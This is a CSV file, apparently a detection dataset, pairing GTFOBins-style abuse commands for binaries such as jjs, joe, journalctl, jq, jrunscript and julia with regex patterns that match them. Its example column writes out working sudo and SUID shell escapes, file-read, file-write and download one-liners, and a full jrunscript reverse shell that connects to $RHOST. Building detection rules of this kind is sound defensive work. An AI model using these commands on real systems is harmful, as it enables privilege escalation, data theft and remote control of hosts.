"Name","Function","ExampleCode","RegexStrictV8","Notes"
"jjs","file-download","echo ""var URL = Java.type('java.net.URL');
var ws = new URL('$URL');
var Channels = Java.type('java.nio.channels.Channels');
var rbc = Channels.newChannel(ws.openStream());
var FileOutputStream = Java.type('java.io.FileOutputStream');
var fos = new FileOutputStream('$LFILE');
fos.getChannel().transferFrom(rbc, 0, Number.MAX_VALUE);
fos.close();
rbc.close();"" | jjs","(?i)\b(?:\S*/)?echo\b.*type\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*URL\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*type\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*newChannel\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*type\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*FileOutputStream\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*getChannel\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*transferFrom\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*close",""
"jjs","file-write","echo 'var FileWriter = Java.type(""java.io.FileWriter"");
var fw=new FileWriter(""./file_to_write"");
fw.write(""DATA"");
fw.close();' | jjs","(?i)\b(?:\S*/)?echo\b.*type\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*FileWriter\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*write\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*close\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*close",""
"jjs","file-read","echo 'var BufferedReader = Java.type(""java.io.BufferedReader"");
var FileReader = Java.type(""java.io.FileReader"");
var br = new BufferedReader(new FileReader(""file_to_read""));
while ((line = br.readLine()) != null) { print(line); }' | jjs","(?i)\b(?:\S*/)?echo\b.*type\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*type\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*BufferedReader\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*while\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*print\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\)",""
"jjs","suid","echo ""Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)').waitFor()"" | ./jjs","(?i)\b(?:\S*/)?echo\b.*type\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*getRuntime\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*exec\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))\s*\).*waitFor\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*/bin/sh",""
"jjs","sudo","echo ""Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()"" | sudo jjs","(?i)\b(?:\S*/)?echo\b.*type\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*getRuntime\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*exec\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))\s*\).*waitFor\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*/bin/sh.*\-c",""
"joe","shell","joe
^K!/bin/sh","(?i)\b(?:\S*/)?joe\b.*/bin/sh",""
"joe","limited-suid","./joe
^K!/bin/sh","(?i)\b(?:\S*/)?joe\b.*/bin/sh",""
"joe","sudo","sudo joe
^K!/bin/sh","(?i)\b(?:\S*/)?sudo\b.*/bin/sh",""
"join","file-read","join -a 2 /dev/null $LFILE","(?i)\b(?:\S*/)?join\b.*.+",""
"join","suid","./join -a 2 /dev/null $LFILE","(?i)\b(?:\S*/)?join\b.*.+",""
"join","sudo","sudo join -a 2 /dev/null $LFILE","(?i)\b(?:\S*/)?sudo\b.*.+",""
"journalctl","shell","journalctl
!/bin/sh","(?i)\b(?:\S*/)?journalctl\b.*/bin/sh",""
"journalctl","sudo","sudo journalctl
!/bin/sh","(?i)\b(?:\S*/)?sudo\b.*/bin/sh",""
"jq","file-read","jq -Rr . ""$LFILE""","(?i)\b(?:\S*/)?jq\b.*\-r",""
"jq","suid","./jq -Rr . ""$LFILE""","(?i)\b(?:\S*/)?jq\b.*\-r",""
"jq","sudo","sudo jq -Rr . ""$LFILE""","(?i)\b(?:\S*/)?sudo\b.*\-r",""
"jrunscript","shell","jrunscript -e ""exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')""","(?i)\b(?:\S*/)?jrunscript\b.*exec\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))\s*\).*/bin/sh.*\-c",""
"jrunscript","reverse-shell","jrunscript -e 'var host='""'""""$RHOST""""'""'; var port='""$RPORT""';
var p=new java.lang.ProcessBuilder(""/bin/bash"", ""-i"").redirectErrorStream(true).start();
var s=new java.net.Socket(host,port);
var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){
while(pi.available()>0)so.write(pi.read());
while(pe.available()>0)so.write(pe.read());
while(si.available()>0)po.write(si.read());
so.flush();po.flush();
java.lang.Thread.sleep(50);
try {p.exitValue();break;}catch (e){}};p.destroy();s.close();'","(?i)\b(?:\S*/)?jrunscript\b.*ProcessBuilder\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*redirectErrorStream\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*start\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*Socket\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*getInputStream\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*getErrorStream\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*getInputStream\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*getOutputStream\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*close.*/bin/bash",""
"jrunscript","file-download","jrunscript -e ""cp('$URL','$LFILE')""","(?i)\b(?:\S*/)?jrunscript\b.*cp\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\)",""
"jrunscript","file-write","jrunscript -e 'var fw=new java.io.FileWriter(""./file_to_write""); fw.write(""DATA""); fw.close();'","(?i)\b(?:\S*/)?jrunscript\b.*FileWriter\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*write\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*close\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*close",""
"jrunscript","file-read","jrunscript -e 'br = new BufferedReader(new java.io.FileReader(""file_to_read"")); while ((line = br.readLine()) != null) { print(line); }'","(?i)\b(?:\S*/)?jrunscript\b.*BufferedReader\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*while\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*print\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\)",""
"jrunscript","suid","./jrunscript -e ""exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)')""","(?i)\b(?:\S*/)?jrunscript\b.*exec\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))\s*\).*/bin/sh",""
"jrunscript","sudo","sudo jrunscript -e ""exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')""","(?i)\b(?:\S*/)?sudo\b.*exec\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))\s*\).*/bin/sh.*\-c",""
"jtag","shell","jtag --interactive
shell /bin/sh","(?i)\b(?:\S*/)?jtag\b.*/bin/sh",""
"jtag","sudo","sudo jtag --interactive
shell /bin/sh","(?i)\b(?:\S*/)?sudo\b.*/bin/sh",""
"julia","shell","julia -e 'run(`/bin/sh`)'","(?i)\b(?:\S*/)?julia\b.*run\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*/bin/sh",""
"julia","file-read","julia -e 'print(open(f->read(f, String), ENV[""LFILE""]))'","(?i)\b(?:\S*/)?julia\b.*print\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\)",""
"julia","file-write","julia -e 'open(f->write(f, ""DATA""), ENV[""LFILE""], ""w"")'","(?i)\b(?:\S*/)?julia\b.*open\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\)",""
"julia","file-download","julia -e 'download(ENV[""URL""], ENV[""LFILE""])'","(?i)\b(?:\S*/)?julia\b.*download\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\)",""
